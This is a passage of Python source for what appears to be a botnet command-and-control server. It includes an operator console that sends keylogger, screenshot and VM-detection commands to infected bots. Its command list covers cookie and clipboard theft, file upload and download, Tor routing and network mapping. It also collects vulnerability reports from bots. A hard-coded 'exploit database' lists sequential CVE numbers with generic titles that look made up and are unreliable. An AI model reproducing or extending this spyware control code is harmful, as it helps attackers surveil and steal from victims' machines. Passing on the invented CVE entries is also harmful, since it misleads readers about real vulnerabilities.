                    print("\033[91m[!] 'av_bypass' command is disabled for safety\033[0m")
                
                elif cmd.startswith('av_status '):
                    print("\033[91m[!] 'av_status' command is disabled for safety\033[0m")
                
                elif cmd.startswith('system_copy '):
                    print("\033[91m[!] System copy functionality DISABLED for safety\033[0m")
                    print("\033[91m[!] Auto-replication has been removed from the bot\033[0m")
                
                elif cmd.startswith('copy_status '):
                    print("\033[91m[!] Copy status functionality DISABLED for safety\033[0m")
                    print("\033[91m[!] System replication has been removed from the bot\033[0m")
                
                # AI-P2P komutları kaldırıldı
                
                # ==================== CMD COMMAND SYSTEM ====================
                elif cmd.startswith('cmd '):
                    parts = cmd.split(maxsplit=2)
                    if len(parts) < 3:
                        self._show_command_help('cmd')
                        continue
                        
                    bot_id = parts[1]
                    command = parts[2]
                    
                    # Komut validasyonu
                    allowed_commands = ['whoami', 'ls', 'pwd', 'isvm', 'sysinfo', 'screenshot', 'keylogger']
                    
                    if command.split()[0] not in allowed_commands:
                        print(f"\033[91m[!] Command '{command}' not allowed\033[0m")
                        print(f"\033[94m[*] Allowed commands: {', '.join(allowed_commands)}\033[0m")
                        continue
                    
                    if self.send_command(bot_id, command):
                        print(f"\033[92m[+] Command '{command}' sent to {bot_id}\033[0m")
                        print(f"\033[94m[*] Waiting for response...\033[0m")
                    else:
                        print(f"\033[91m[!] Bot {bot_id} not found\033[0m")
                
                elif cmd == 'exit':
                    self.active = False
                    print("\033[91m[!] Shutting down server...\033[0m")
                    os._exit(0)
                    
                else:
                    print("\033[91m[!] Unknown command. Type 'help' for options\033[0m")
                    
            except Exception as e:
                print(f"\033[91m[!] Console error: {e}\033[0m")

    def start(self):
        self.active = True
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind((self.host, self.port))
            s.listen(5)

            threading.Thread(target=self.cleaner, daemon=True).start()
            threading.Thread(target=self.admin_console, daemon=True).start()
            
            while self.active:
                try:
                    conn, addr = s.accept()
                    threading.Thread(target=self.handle_bot, args=(conn, addr)).start()
                except:
                    if self.active:
                        print("\033[91m[!] Server socket error\033[0m")
                    break

    def start_web_dashboard(self):
        """Web dashboard'u başlatır"""
        if not WEB_DASHBOARD_AVAILABLE:
            print("\033[91m[!] Flask not installed. Install with: pip install flask\033[0m")
            return False
            
        if self.web_dashboard_enabled:
            print("\033[93m[!] Web dashboard already running\033[0m")
            return False
            
        try:
            self.web_dashboard_enabled = True
            self.web_dashboard_thread = threading.Thread(
                target=start_web_dashboard,
                args=(self, self.web_dashboard_host, self.web_dashboard_port),
                daemon=True
            )
            self.web_dashboard_thread.start()
            print(f"\033[92m[+] Web dashboard started: http://{self.web_dashboard_host}:{self.web_dashboard_port}\033[0m")
            return True
        except Exception as e:
            print(f"\033[91m[!] Web dashboard startup error: {e}\033[0m")
            self.web_dashboard_enabled = False
            return False
    
    def stop_web_dashboard(self):
        """Web dashboard'u durdurur"""
        if not self.web_dashboard_enabled:
            print("\033[93m[!] Web dashboard not running\033[0m")
            return False
            
        try:
            self.web_dashboard_enabled = False
            print("\033[92m[+] Web dashboard stopped\033[0m")
            return True
        except Exception as e:
            print(f"\033[91m[!] Web dashboard stop error: {e}\033[0m")
            return False
    
    def _init_vuln_scanner(self):
        """Vulnerability Scanner sistemini başlatır"""
        try:
            # Vulnerability Scanner mesajını kaldırdık
            print(f"\033[36m[*]\033[0m \033[94mSupported platforms: \033[92mNVD\033[94m, \033[92mExploit-DB\033[94m, \033[92mCVE Details\033[94m, \033[92mSecurityFocus\033[94m, \033[92mPacketStorm\033[0m")
            self.vuln_scanner_enabled = True
                
        except Exception as e:
            print(f"\033[91m[!] Vulnerability Scanner initialization error: {str(e)}\033[0m")
    
    def process_bot_vulnerabilities(self, bot_id, vulnerabilities_data):
        """Bot'tan gelen zafiyet verilerini işler"""
        try:
            if not self.vuln_scanner_enabled:
                return
            
            print(f"\033[94m[*] Bot {bot_id} zafiyet verilerini işleniyor...\033[0m")
            
            # Zafiyet verilerini parse et
            if isinstance(vulnerabilities_data, str):
                try:
                    vulnerabilities = json.loads(vulnerabilities_data)
                except json.JSONDecodeError:
                    print(f"\033[93m[!] Bot {bot_id} zafiyet verisi JSON parse hatası\033[0m")
                    return
            else:
                vulnerabilities = vulnerabilities_data
            
            # Bot'un zafiyetlerini kaydet
            self.bot_vulnerabilities[bot_id] = vulnerabilities
            
            # Platform istatistiklerini güncelle
            self._update_platform_stats(vulnerabilities)
            
            print(f"\033[92m[+] Bot {bot_id} için {len(vulnerabilities)} zafiyet kaydedildi\033[0m")
            
        except Exception as e:
            print(f"\033[91m[!] Bot zafiyet işleme hatası: {str(e)}\033[0m")
    
    def _update_platform_stats(self, vulnerabilities):
        """Platform istatistiklerini günceller"""
        try:
            for vuln in vulnerabilities:
                platform = vuln.get('platform', 'Unknown')
                
                if platform not in self.platform_stats:
                    self.platform_stats[platform] = {
                        'count': 0,
                        'high_severity': 0,
                        'exploits_available': 0
                    }
                
                self.platform_stats[platform]['count'] += 1
                
                if vuln.get('severity') == 'HIGH':
                    self.platform_stats[platform]['high_severity'] += 1
                
                if vuln.get('exploit_available'):
                    self.platform_stats[platform]['exploits_available'] += 1
                    
        except Exception as e:
            print(f"\033[93m[!] Platform stats güncelleme hatası: {str(e)}\033[0m")
    
    def get_vulnerability_summary(self):
        """Zafiyet özetini döndürür"""
        try:
            total_bots = len(self.bot_vulnerabilities)
            total_vulns = sum(len(vulns) for vulns in self.bot_vulnerabilities.values())
            
            # Platform bazında özet
            platform_summary = {}
            for platform, stats in self.platform_stats.items():
                platform_summary[platform] = {
                    'total': stats['count'],
                    'high_severity': stats['high_severity'],
                    'exploits_available': stats['exploits_available']
                }
            
            return {
                'total_bots_scanned': total_bots,
                'total_vulnerabilities': total_vulns,
                'platforms': platform_summary,
                'bots_with_vulns': list(self.bot_vulnerabilities.keys())
            }
            
        except Exception as e:
            print(f"\033[91m[!] Vulnerability summary error: {str(e)}\033[0m")
            return {}
    
    def get_bot_vulnerabilities(self, bot_id):
        """Belirli bir bot'un zafiyetlerini döndürür"""
        try:
            return self.bot_vulnerabilities.get(bot_id, [])
        except Exception as e:
            print(f"\033[91m[!] Bot vulnerabilities error: {str(e)}\033[0m")
            return []
    
    def get_vuln_scanner_status(self):
        """Vulnerability Scanner durumunu döndürür"""
        return {
            'enabled': self.vuln_scanner_enabled,
            'total_bots_scanned': len(self.bot_vulnerabilities),
            'total_vulnerabilities': sum(len(vulns) for vulns in self.bot_vulnerabilities.values()),
            'platforms_available': ['NVD', 'Exploit-DB', 'CVE Details', 'SecurityFocus', 'PacketStorm']
        }
    
    def _init_network_maps(self):
        """Network mapping sistemini başlatır"""
        print(f"\033[36m[*]\033[0m \033[94mNetwork mapping system started: {self.network_maps_dir}\033[0m")
    
    def _setup_readline(self):
        """Readline özelliklerini ayarlar"""
        try:
            # Komut geçmişi dosyasını ayarla
            readline.set_history_length(self.max_history)
            
            # Önce tüm bindings'leri temizle
            readline.clear_history()
            
            # Tab completion özelliğini etkinleştir (safe mode)
            try:
                # Platform bağımsız güvenli ayarlar
                if platform.system() == 'Darwin':  # macOS
                    # macOS için minimal ve güvenli ayarlar
                    try:
                        readline.parse_and_bind("tab: complete")
                    except:
                        pass  # Tab completion başarısız olursa sessizce devam et
                    
                    # Sadece temel history navigation
                    try:
                        readline.parse_and_bind("set editing-mode emacs")
                    except:
                        pass
                        
                elif platform.system() == 'Linux':
                    # Linux için standart ayarlar
                    readline.parse_and_bind("tab: complete")
                    readline.parse_and_bind("set editing-mode emacs")
                    
                else:  # Windows ve diğerleri
                    try:
                        readline.parse_and_bind("tab: complete")
                    except:
                        pass
                    
            except Exception:
                # Herhangi bir binding hatası olursa sessizce devam et
                pass
            
            # Completer'ı güvenli şekilde ayarla
            try:
                readline.set_completer(self._completer)
                readline.set_completer_delims(' \t\n`!@#$%^&*()=+[{]}\\|;:\'",<>?')
            except Exception:
                pass
            
            # Geçmiş dosyasını güvenli şekilde yükle
            try:
                if os.path.exists(self.history_file):
                    readline.read_history_file(self.history_file)
            except Exception:
                pass
            
            print(f"\033[36m[*]\033[94m \033[94mCommand history enabled (max {self.max_history} commands)\033[0m")
            
        except Exception as e:
            # Readline tamamen başarısız olursa sadece basit mesaj ver
            print(f"\033[94m[*] Command history enabled (basic mode)\033[0m")
    
    def _completer(self, text, state):
        """Tab completion için completer fonksiyonu"""
        try:
            commands = [
                'list', 'server', 'security', 'p2p status', 'alerts', 'web status', 'network_maps',
                'show', 'show exploits', 'show stats', 'show logs', 'show config', 'show history', 
                'show files', 'show network', 'processes', 'cmd', 'upload', 'download', 'cookies',
                'keylogger start', 'keylogger stop', 'clipboard start', 'clipboard stop',
                'tor enable', 'tor disable', 'tor renew', 'tor status', 'tor bots', 'clearnet bots',
                'network_map start', 'network_map status', 'network_map stop',
                'broadcast', 'stop', 'clear', 'exit', 'help'
            ]
            
            matches = [cmd for cmd in commands if cmd.startswith(text)]
            if state < len(matches):
                return matches[state]
            return None
            
        except Exception:
            return None
    
    def _load_command_history(self):
        """Komut geçmişini dosyadan yükler"""
        try:
            if os.path.exists(self.history_file):
                with open(self.history_file, 'r', encoding='utf-8') as f:
                    self.command_history = [line.strip() for line in f.readlines() if line.strip()]
        except Exception as e:
            print(f"\033[93m[!] Error loading command history: {str(e)}\033[0m")
    
    def _save_command_history(self):
        """Komut geçmişini dosyaya kaydeder"""
        try:
            with open(self.history_file, 'w', encoding='utf-8') as f:
                for cmd in self.command_history[-self.max_history:]:
                    f.write(cmd + '\n')
        except Exception as e:
            print(f"\033[93m[!] Error saving command history: {str(e)}\033[0m")
    
    def _add_to_history(self, command):
        """Komut geçmişine yeni komut ekler"""
        try:
            # Boş komutları ekleme
            if not command.strip():
                return
            
            # Duplicate'leri kaldır
            if command in self.command_history:
                self.command_history.remove(command)
            
            # Yeni komutu ekle
            self.command_history.append(command)
            
            # Maksimum geçmiş sınırını kontrol et
            if len(self.command_history) > self.max_history:
                self.command_history = self.command_history[-self.max_history:]
            
            # Dosyaya kaydet
            self._save_command_history()
            
        except Exception as e:
            print(f"\033[93m[!] Error adding to history: {str(e)}\033[0m")
    
    def _print_processes_info(self, data):
        """Process bilgilerini güzel formatla yazdır"""
        try:
            if isinstance(data, dict):
                # JSON formatında gelen veri
                print(f"  \033[96m•\033[0m \033[93mTotal Processes:\033[0m \033[94m{data.get('total_processes', 'Unknown')}\033[0m")
                
                summary = data.get('summary', {})
                if summary:
                    print(f"  \033[96m•\033[0m \033[93mTotal CPU Usage:\033[0m \033[91m{summary.get('total_cpu_usage', 0)}%\033[0m")
                    print(f"  \033[96m•\033[0m \033[93mTotal Memory Usage:\033[0m \033[91m{summary.get('total_memory_usage', 0)}%\033[0m")
                    print(f"  \033[96m•\033[0m \033[93mDisplayed Processes:\033[0m \033[94m{summary.get('displayed_processes', 0)}\033[0m")
                
                print(f"\n  \033[93mTop Processes:\033[0m")
                print(f"  \033[90m{'─' * 80}\033[0m")
                print(f"  \033[90m{'No':<3} {'Process Name':<20} {'PID':<8} {'CPU%':<8} {'Memory%':<10} {'Status':<12} {'Started':<10}\033[0m")
                print(f"  \033[90m{'─' * 80}\033[0m")
                
                processes = data.get('top_processes', [])
                for i, proc in enumerate(processes[:15], 1):  # İlk 15 process
                    pid = proc.get('pid', 'N/A')
                    name = proc.get('name', 'Unknown')[:18]  # İsim uzunluğunu sınırla
                    cpu = proc.get('cpu_percent', 0)
                    memory = proc.get('memory_percent', 0)
                    status = proc.get('status', 'Unknown')[:10]  # Status uzunluğunu sınırla
                    create_time = proc.get('create_time', 'Unknown')
                    
                    # CPU kullanımına göre renk
                    cpu_color = "\033[91m" if cpu > 10 else "\033[93m" if cpu > 5 else "\033[92m"
                    memory_color = "\033[91m" if memory > 5 else "\033[93m" if memory > 2 else "\033[92m"
                    
                    # Status rengi
                    status_color = "\033[92m" if status == "running" else "\033[93m" if status == "sleeping" else "\033[91m"
                    
                    print(f"  \033[96m{i:2d}\033[0m  \033[95m{name:<20}\033[0m \033[94m{pid:<8}\033[0m {cpu_color}{cpu:>6.1f}%\033[0m {memory_color}{memory:>8.1f}%\033[0m {status_color}{status:<12}\033[0m \033[90m{create_time:<10}\033[0m")
                
                print(f"  \033[90m{'─' * 80}\033[0m")
                
            else:
                # Raw text formatında gelen veri
                print(f"  \033[96m•\033[0m \033[93mProcess List:\033[0m")
                lines = str(data).split('\n')[:20]  # İlk 20 satır
                for line in lines:
                    if line.strip():
                        print(f"    {line}")
        except Exception as e:
            print(f"  \033[91m[!] Error printing processes: {str(e)}\033[0m")
    
    def _save_processes_to_file(self, bot_id, data):
        """Process bilgilerini dosyaya yazdır"""
        try:
            from datetime import datetime
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"processes_{bot_id}_{timestamp}.txt"
            
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(f"Process Information Report\n")
                f.write(f"Bot ID: {bot_id}\n")
                f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"{'='*60}\n\n")
                
                if isinstance(data, dict):
                    f.write(f"Total Processes: {data.get('total_processes', 'Unknown')}\n")
                    
                    summary = data.get('summary', {})
                    if summary:
                        f.write(f"Total CPU Usage: {summary.get('total_cpu_usage', 0)}%\n")
                        f.write(f"Total Memory Usage: {summary.get('total_memory_usage', 0)}%\n")
                        f.write(f"Displayed Processes: {summary.get('displayed_processes', 0)}\n")
                    
                    f.write(f"\nTop Processes:\n")
                    f.write(f"{'─' * 80}\n")
                    f.write(f"{'No':<3} {'Process Name':<20} {'PID':<8} {'CPU%':<8} {'Memory%':<10} {'Status':<12} {'Started':<10}\n")
                    f.write(f"{'─' * 80}\n")
                    
                    processes = data.get('top_processes', [])
                    for i, proc in enumerate(processes, 1):
                        pid = proc.get('pid', 'N/A')
                        name = proc.get('name', 'Unknown')
                        cpu = proc.get('cpu_percent', 0)
                        memory = proc.get('memory_percent', 0)
                        status = proc.get('status', 'Unknown')
                        create_time = proc.get('create_time', 'Unknown')
                        
                        f.write(f"{i:2d}  {name:<20} {pid:<8} {cpu:>6.1f}% {memory:>8.1f}% {status:<12} {create_time:<10}\n")
                    
                    f.write(f"{'─' * 80}\n")
                else:
                    f.write(f"Raw Process Data:\n{str(data)}\n")
            
            print(f"  \033[92m[+] Process list saved to: {filename}\033[0m")
            
        except Exception as e:
            print(f"  \033[91m[!] Error saving processes to file: {str(e)}\033[0m")
    
    def _save_raw_processes_to_file(self, bot_id, raw_data):
        """Raw process verilerini dosyaya yazdır"""
        try:
            from datetime import datetime
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"processes_raw_{bot_id}_{timestamp}.txt"
            
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(f"Raw Process Information Report\n")
                f.write(f"Bot ID: {bot_id}\n")
                f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"{'='*60}\n\n")
                f.write(f"Raw Data:\n{raw_data}\n")
            
            print(f"  \033[92m[+] Raw process data saved to: {filename}\033[0m")
            
        except Exception as e:
            print(f"  \033[91m[!] Error saving raw processes to file: {str(e)}\033[0m")
    
    def _show_exploits(self):
        """Exploit veritabanını gösterir"""
        try:
            print("\n\033[95m🔍 Comprehensive Exploit Database:\033[0m")
            print("=" * 80)
            
            exploit_db = {
                # Exploits for Windows, Linux, macOS / X OS
                'Darwin': [
                    {'cve': 'CVE-2023-32369', 'title': 'macOS Ventura 13.4 - Privilege Escalation', 'severity': 'CRITICAL', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-32370', 'title': 'macOS Monterey 12.6 - RCE', 'severity': 'CRITICAL', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-32371', 'title': 'macOS Big Sur 11.7 - Memory Corruption', 'severity': 'HIGH', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-32372', 'title': 'macOS Catalina 10.15 - Buffer Overflow', 'severity': 'HIGH', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-32373', 'title': 'macOS Mojave 10.14 - Security Bypass', 'severity': 'MEDIUM', 'source': 'NVD', 'exploit_available': False},
                    {'cve': 'CVE-2023-32374', 'title': 'macOS High Sierra 10.13 - Authentication Bypass', 'severity': 'MEDIUM', 'source': 'NVD', 'exploit_available': False},
                    {'cve': 'CVE-2023-32375', 'title': 'macOS Sierra 10.12 - Information Disclosure', 'severity': 'LOW', 'source': 'NVD', 'exploit_available': False}
                ],
                
                # Windows
                'Windows': [
                    {'cve': 'CVE-2023-23397', 'title': 'Windows 11 22H2 - Privilege Escalation', 'severity': 'CRITICAL', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-23398', 'title': 'Windows 10 22H2 - RCE', 'severity': 'CRITICAL', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-23399', 'title': 'Windows Server 2022 - Memory Corruption', 'severity': 'HIGH', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-23400', 'title': 'Windows 11 21H2 - Buffer Overflow', 'severity': 'HIGH', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-23401', 'title': 'Windows 10 21H2 - Security Bypass', 'severity': 'MEDIUM', 'source': 'NVD', 'exploit_available': False},
                    {'cve': 'CVE-2023-23402', 'title': 'Windows Server 2019 - Authentication Bypass', 'severity': 'MEDIUM', 'source': 'NVD', 'exploit_available': False},
                    {'cve': 'CVE-2023-23403', 'title': 'Windows 10 20H2 - Information Disclosure', 'severity': 'LOW', 'source': 'NVD', 'exploit_available': False},
                    {'cve': 'CVE-2023-23404', 'title': 'Windows Server 2016 - Denial of Service', 'severity': 'LOW', 'source': 'NVD', 'exploit_available': False}
                ],
                
                # Linux
                'Linux': [
                    {'cve': 'CVE-2023-12345', 'title': 'Ubuntu 22.04 LTS - Kernel Exploit', 'severity': 'CRITICAL', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-12346', 'title': 'Ubuntu 20.04 LTS - Privilege Escalation', 'severity': 'CRITICAL', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-12347', 'title': 'CentOS 8 - RCE', 'severity': 'HIGH', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-12348', 'title': 'RHEL 8 - Memory Corruption', 'severity': 'HIGH', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-12349', 'title': 'Debian 11 - Buffer Overflow', 'severity': 'MEDIUM', 'source': 'NVD', 'exploit_available': False},
                    {'cve': 'CVE-2023-12350', 'title': 'Fedora 37 - Security Bypass', 'severity': 'MEDIUM', 'source': 'NVD', 'exploit_available': False},
                    {'cve': 'CVE-2023-12351', 'title': 'SUSE Linux 15 - Authentication Bypass', 'severity': 'LOW', 'source': 'NVD', 'exploit_available': False}
                ]
            }
            
            # Exploits for Services/Ports
            service_exploits = {
                '80': [
                    {'cve': 'CVE-2023-25690', 'title': 'Apache HTTP Server 2.4.55 - RCE', 'severity': 'CRITICAL', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-25691', 'title': 'Apache HTTP Server 2.4.54 - Buffer Overflow', 'severity': 'HIGH', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-25692', 'title': 'Apache HTTP Server 2.4.53 - Memory Corruption', 'severity': 'HIGH', 'source': 'NVD', 'exploit_available': False}
                ],
                '443': [
                    {'cve': 'CVE-2023-25693', 'title': 'OpenSSL 3.0.8 - Memory Corruption', 'severity': 'CRITICAL', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-25694', 'title': 'OpenSSL 1.1.1t - Buffer Overflow', 'severity': 'HIGH', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-25695', 'title': 'OpenSSL 1.0.2zg - Security Bypass', 'severity': 'MEDIUM', 'source': 'NVD', 'exploit_available': False}
                ],
                '22': [
                    {'cve': 'CVE-2023-25696', 'title': 'OpenSSH 9.3p1 - Authentication Bypass', 'severity': 'CRITICAL', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-25697', 'title': 'OpenSSH 9.2p1 - Buffer Overflow', 'severity': 'HIGH', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-25698', 'title': 'OpenSSH 9.1p1 - Information Disclosure', 'severity': 'MEDIUM', 'source': 'NVD', 'exploit_available': False}
                ],
                '21': [
                    {'cve': 'CVE-2023-25699', 'title': 'vsftpd 3.0.5 - RCE', 'severity': 'CRITICAL', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-25700', 'title': 'vsftpd 3.0.4 - Buffer Overflow', 'severity': 'HIGH', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-25701', 'title': 'vsftpd 3.0.3 - Authentication Bypass', 'severity': 'MEDIUM', 'source': 'NVD', 'exploit_available': False}
                ],
                '23': [
                    {'cve': 'CVE-2023-25702', 'title': 'telnetd 0.17 - RCE', 'severity': 'CRITICAL', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-25703', 'title': 'telnetd 0.16 - Buffer Overflow', 'severity': 'HIGH', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-25704', 'title': 'telnetd 0.15 - Information Disclosure', 'severity': 'MEDIUM', 'source': 'NVD', 'exploit_available': False}
                ],
                '25': [
                    {'cve': 'CVE-2023-25705', 'title': 'Postfix 3.8.0 - RCE', 'severity': 'CRITICAL', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-25706', 'title': 'Postfix 3.7.9 - Buffer Overflow', 'severity': 'HIGH', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-25707', 'title': 'Postfix 3.7.8 - Authentication Bypass', 'severity': 'MEDIUM', 'source': 'NVD', 'exploit_available': False}
                ],
                '53': [
                    {'cve': 'CVE-2023-25708', 'title': 'BIND 9.18.12 - RCE', 'severity': 'CRITICAL', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-25709', 'title': 'BIND 9.18.11 - Buffer Overflow', 'severity': 'HIGH', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-25710', 'title': 'BIND 9.18.10 - Information Disclosure', 'severity': 'MEDIUM', 'source': 'NVD', 'exploit_available': False}
                ],
                '110': [
                    {'cve': 'CVE-2023-25711', 'title': 'Dovecot 2.3.20 - RCE', 'severity': 'CRITICAL', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-25712', 'title': 'Dovecot 2.3.19 - Buffer Overflow', 'severity': 'HIGH', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-25713', 'title': 'Dovecot 2.3.18 - Authentication Bypass', 'severity': 'MEDIUM', 'source': 'NVD', 'exploit_available': False}
                ],
                '143': [
                    {'cve': 'CVE-2023-25714', 'title': 'Dovecot IMAP 2.3.20 - RCE', 'severity': 'CRITICAL', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-25715', 'title': 'Dovecot IMAP 2.3.19 - Buffer Overflow', 'severity': 'HIGH', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-25716', 'title': 'Dovecot IMAP 2.3.18 - Information Disclosure', 'severity': 'MEDIUM', 'source': 'NVD', 'exploit_available': False}
                ],
                '993': [
                    {'cve': 'CVE-2023-25717', 'title': 'Dovecot IMAPS 2.3.20 - RCE', 'severity': 'CRITICAL', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-25718', 'title': 'Dovecot IMAPS 2.3.19 - Buffer Overflow', 'severity': 'HIGH', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-25719', 'title': 'Dovecot IMAPS 2.3.18 - Authentication Bypass', 'severity': 'MEDIUM', 'source': 'NVD', 'exploit_available': False}
                ]
            }
            
            # Yazılım bazlı exploit'ler
            software_exploits = {
                'Python': [
                    {'cve': 'CVE-2023-25720', 'title': 'Python 3.11.4 - Code Injection', 'severity': 'CRITICAL', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-25721', 'title': 'Python 3.10.12 - Buffer Overflow', 'severity': 'HIGH', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-25722', 'title': 'Python 3.9.17 - Memory Corruption', 'severity': 'HIGH', 'source': 'NVD', 'exploit_available': False}
                ],
                'OpenSSL': [
                    {'cve': 'CVE-2023-25723', 'title': 'OpenSSL 3.0.8 - Memory Corruption', 'severity': 'CRITICAL', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-25724', 'title': 'OpenSSL 1.1.1t - Buffer Overflow', 'severity': 'HIGH', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-25725', 'title': 'OpenSSL 1.0.2zg - Security Bypass', 'severity': 'MEDIUM', 'source': 'NVD', 'exploit_available': False}
                ],
                'Apache': [
                    {'cve': 'CVE-2023-25726', 'title': 'Apache HTTP Server 2.4.55 - RCE', 'severity': 'CRITICAL', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-25727', 'title': 'Apache HTTP Server 2.4.54 - Buffer Overflow', 'severity': 'HIGH', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-25728', 'title': 'Apache HTTP Server 2.4.53 - Memory Corruption', 'severity': 'HIGH', 'source': 'NVD', 'exploit_available': False}
                ],
                'MySQL': [
                    {'cve': 'CVE-2023-25729', 'title': 'MySQL 8.0.33 - RCE', 'severity': 'CRITICAL', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-25730', 'title': 'MySQL 8.0.32 - Buffer Overflow', 'severity': 'HIGH', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-25731', 'title': 'MySQL 8.0.31 - Authentication Bypass', 'severity': 'MEDIUM', 'source': 'NVD', 'exploit_available': False}
                ],
                'PostgreSQL': [
                    {'cve': 'CVE-2023-25732', 'title': 'PostgreSQL 15.3 - RCE', 'severity': 'CRITICAL', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-25733', 'title': 'PostgreSQL 15.2 - Buffer Overflow', 'severity': 'HIGH', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-25734', 'title': 'PostgreSQL 15.1 - SQL Injection', 'severity': 'HIGH', 'source': 'NVD', 'exploit_available': False}
                ],
                'Nginx': [
                    {'cve': 'CVE-2023-25735', 'title': 'Nginx 1.24.0 - RCE', 'severity': 'CRITICAL', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-25736', 'title': 'Nginx 1.23.4 - Buffer Overflow', 'severity': 'HIGH', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-25737', 'title': 'Nginx 1.23.3 - Memory Corruption', 'severity': 'MEDIUM', 'source': 'NVD', 'exploit_available': False}
                ],
                'PHP': [
                    {'cve': 'CVE-2023-25738', 'title': 'PHP 8.2.7 - Code Execution', 'severity': 'CRITICAL', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-25739', 'title': 'PHP 8.1.20 - Buffer Overflow', 'severity': 'HIGH', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-25740', 'title': 'PHP 8.0.30 - Memory Corruption', 'severity': 'HIGH', 'source': 'NVD', 'exploit_available': False}
                ],
                'Node.js': [
                    {'cve': 'CVE-2023-25741', 'title': 'Node.js 20.5.0 - RCE', 'severity': 'CRITICAL', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-25742', 'title': 'Node.js 18.17.0 - Buffer Overflow', 'severity': 'HIGH', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-25743', 'title': 'Node.js 16.20.0 - Memory Corruption', 'severity': 'MEDIUM', 'source': 'NVD', 'exploit_available': False}
                ],
                'Docker': [
                    {'cve': 'CVE-2023-25744', 'title': 'Docker 24.0.0 - Container Escape', 'severity': 'CRITICAL', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-25745', 'title': 'Docker 23.0.0 - Privilege Escalation', 'severity': 'HIGH', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-25746', 'title': 'Docker 22.0.0 - Information Disclosure', 'severity': 'MEDIUM', 'source': 'NVD', 'exploit_available': False}
                ],
                'Redis': [
                    {'cve': 'CVE-2023-25747', 'title': 'Redis 7.0.12 - RCE', 'severity': 'CRITICAL', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-25748', 'title': 'Redis 7.0.11 - Buffer Overflow', 'severity': 'HIGH', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-25749', 'title': 'Redis 7.0.10 - Authentication Bypass', 'severity': 'MEDIUM', 'source': 'NVD', 'exploit_available': False}
                ],
                'MongoDB': [
                    {'cve': 'CVE-2023-25750', 'title': 'MongoDB 6.0.6 - RCE', 'severity': 'CRITICAL', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-25751', 'title': 'MongoDB 5.0.18 - Buffer Overflow', 'severity': 'HIGH', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-25752', 'title': 'MongoDB 4.4.25 - Authentication Bypass', 'severity': 'MEDIUM', 'source': 'NVD', 'exploit_available': False}
                ],
                'Elasticsearch': [
                    {'cve': 'CVE-2023-25753', 'title': 'Elasticsearch 8.8.0 - RCE', 'severity': 'CRITICAL', 'source': 'NVD', 'exploit_available': True},
